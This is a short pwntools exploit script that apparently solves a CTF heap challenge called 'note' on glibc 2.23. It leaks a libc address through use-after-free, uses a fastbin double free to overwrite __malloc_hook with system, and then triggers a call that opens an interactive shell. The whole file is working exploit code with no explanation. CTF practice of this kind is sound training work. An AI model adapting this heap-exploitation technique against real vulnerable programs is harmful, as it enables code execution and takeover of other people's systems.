#!/usr/bin/python3
from pwn import *

# p = remote('edu-ctf.csie.org', 10178)
p = process('./note')
libc = ELF('./libc-2.23.so')

def add(size, note):
    p.sendlineafter('>', str(1))
    p.sendlineafter('Size:', str(size))
    p.sendlineafter('Note:', note)

def show(index):
    p.sendlineafter('>', str(2))
    p.sendlineafter('Index:', str(index))


def delete(index):
    p.sendlineafter('>', str(3))
    p.sendlineafter('Index:', str(index))

add(0x90, 'a' * 0x8e)
add(0x60, 'a' * 0xe)
delete(0)
show(0)
p.recvuntil(b'Note 0:\x0a')
libc.address = u64(p.recv(6).ljust(0x8, b'\0')) - 0x3c4b78
log.info('libc.address : %s' % hex(libc.address))
log.info('libc /bin/sh address : %s' % hex(next(libc.search(b'/bin/sh'))))

add(0x60, 'a' * 0xe)
delete(1)
delete(2)
delete(1)

add(0x60, p64(libc.symbols['__malloc_hook'] - 0x18 + 0x5))
add(0x60, 'garbage')
add(0x60, 'garbage')
add(0x60, b'a' * 3 + p64(libc.symbols['system']))

p.sendlineafter('>', str(1))
p.sendlineafter('Size:', str(next(libc.search(b'/bin/sh'))))

p.interactive()
